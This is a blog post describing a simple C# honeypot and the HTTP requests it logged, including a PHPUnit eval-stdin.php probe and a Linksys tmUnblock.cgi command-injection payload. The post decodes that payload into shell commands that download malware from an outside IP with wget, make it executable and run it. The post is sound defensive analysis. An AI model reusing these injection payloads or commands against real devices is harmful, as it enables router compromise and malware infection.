---
layout: post
title:  "Setting up a basic honey pot"
date:   2022-07-19 17:25:33 +0100
categories: Honey-pot 
tags: Honey-Pot Malware
---

When playing around with a C# web app library, I noticed the web app I was writing would periodically get random (and sometimes strange) requests from unknown sources, so I thought it would be fun to set up a honey pot and record the requests.

### Setting up the honey pot
---
The honey pot is written in mono C# running in a Debian VM, for this first test listening to port `8080`. The honey pot is set up to accept all [HTTP Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) and will record the requests head and body, initially I have set it up to respond HTTP 200 Ok with the text "Hello *requests ip address*"

### The Honey Pot Code 
---
{% highlight C# %}
using System;
using System.Text;
using NanoWebApp;

namespace HoneyPot
{
    public class HoneyPotEndPoint : NanoEndPoint
    {
        public override Response HandleGet(Request request)
        {
            Response response = new Response();

            string body = request.GetBody();

            string headers = "";
            for (int i = 0; i <= request.Http.Headers.Count - 1; i++)
            {
                headers += request.Http.Headers.Get(i) + " ";
            }
            Console.WriteLine($">>>Headers: {headers}");

            Console.WriteLine($">>>Body: {body}");

            response.ResponseData = Encoding.ASCII.GetBytes($"Hello {request.Http.RemoteEndPoint.Address}");

            response.ContentType = request.Http.ContentType;

            response.StatusCode = 200;

            return response;
        }

        public override Response HandlePost(Request request)
        {
            Response response = new Response();

            string body = request.GetBody();

            string headers = "";
            for (int i = 0; i <= request.Http.Headers.Count - 1; i++)
            {
                headers += request.Http.Headers.Get(i) + " ";
            }
            Console.WriteLine($">>>Headers: {headers}");

            Console.WriteLine($">>>Body: {body}");

            response.ResponseData = Encoding.ASCII.GetBytes($"Hello {request.Http.RemoteEndPoint.Address}");

            response.ContentType = request.Http.ContentType;

            response.StatusCode = 200;

            return response;
        }
    }

    public class WebApp : NanoWebApp.NanoWebApp
    {
        public override void Startup()
        {
            HoneyPotEndPoint honeyPotEndPoint = new HoneyPotEndPoint();
            AddEndPoint("/*", honeyPotEndPoint);
        }

        public WebApp(WebAppConfig appConfig) : base(appConfig)
        {
        }
    }

    class MainClass
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("Init");

            WebAppConfig appConfig = new WebAppConfig();
            appConfig.Port = 8080;
            appConfig.Domain = "*";

            WebApp webApp = new WebApp(appConfig);

            webApp.Start();

            Console.ReadLine();
        }
    }
}
{% endhighlight %}

Now we have set up the honey pot we just wait.


### The results 
---
After leaving the honey pot running over night I came back it to find quite a lot of request had been made. 

A lot of the requests came unsurprisingly from [web crawlers](https://en.wikipedia.org/wiki/Web_crawler), such as this one from Censys:

```
20:13:23.402 Handling GET to / request from 167.94.145.60
>>>Headers: HoneyPotIp:8080 Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) */* gzip 
>>>Body: 
20:13:23.403 completed response status 200
```

And this request which looking at the IP seems to have come from [Internet Census Group](https://www.internet-census.org/home.html)
```
22:22:40.321 Handling GET to / request from 23.251.102.74
>>>Headers: 90.216.208.6:8080 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 */* gzip 
>>>Body: 
22:22:40.322 completed response status 200
```

---
Then there are the requests that don't looks so innocent, such as this one:
```
22:38:26.532 Handling POST to /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php request from 185.7.214.104
>>>Headers: HoneyPotIp:8080 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 19 application/x-www-form-urlencoded gzip close 
>>>Body: <?=md5("phpunit")?>
22:38:26.536 completed response status 200
```

Searching for `eval-stdin.php` we can find a few [articles](https://support.alertlogic.com/hc/en-us/articles/115005711043-PHPUnit-eval-stdin-php-Unauthenticated-RCE) relating to a known remote code execution (RCE) vulnerability exists in the in the PHPUnit software


---
But the most interesting requests are those that are trying to infect our device with malware:
```
03:01:00.114 Handling POST to /tmUnblock.cgi request from 45.164.20.154
>>>Headers: 91.218.67.131:80 keep-alive gzip, deflate / python-requests/2.20.0 227 application/x-www-form-urlencoded 
>>>Body: ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F91.218.67.131%2Freaper%2Freap.mpsl%3B+chmod+777+reap.mpsl%3B+.%2Freap.mpsl+Reaper.linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
03:01:00.115 completed response status 200
```
In the above request, we can see that the request is attempting to exploit a [shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) style exploit, by posting a load of commands to `/tmUnblock.cgi`. Searching around on the internet it seems `tmUnblock.cgi` is found in a lot of Cisco/Linksys routers so we can assume these devices are the intended target for this attack.

Looking at the body we can see the request it trying to inject the following code 
```
ttcp_ip=-h+\`cd+/tmp;+rm+-rf+mpsl;+wget+http://91.218.67.131/reaper/reap.mpsl;+chmod+777+reap.mpsl;+./reap.mpsl+Reaper.linksys\`&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
```
Inside the HTTP code there are the following shell commands 

{% highlight shell %}
cd /tmp
rm -rf mspl
wget http://91.218.67.131/reaper/reap.mpsl 
chmod 777 reap.mpsl 
./reap.mpsl Reaper.linksys
{% endhighlight %}

breaking down the code we can see its trying to do the following:
1. `cd /tmp` chagne the current directroy to /tmp 
2. `rm -rf mspl` remove (delete) the file mspl
3. `wget http://91.218.67.131/reaper/reap.mpsl` use [wget](https://www.gnu.org/software/wget/) to download the attackers malware to ./
4. `chmod 777 reap.mpsl` change the file permitions of the downloaded malware file to make it executable 
5. `./reap.mpsl Reaper.linksys` run the malware

Using [curl](http://www.curl.se) I download `read.mpsl` to disassemble and analyse it with [Ghidra](https://ghidra-sre.org/), see the next page for my analysis. 



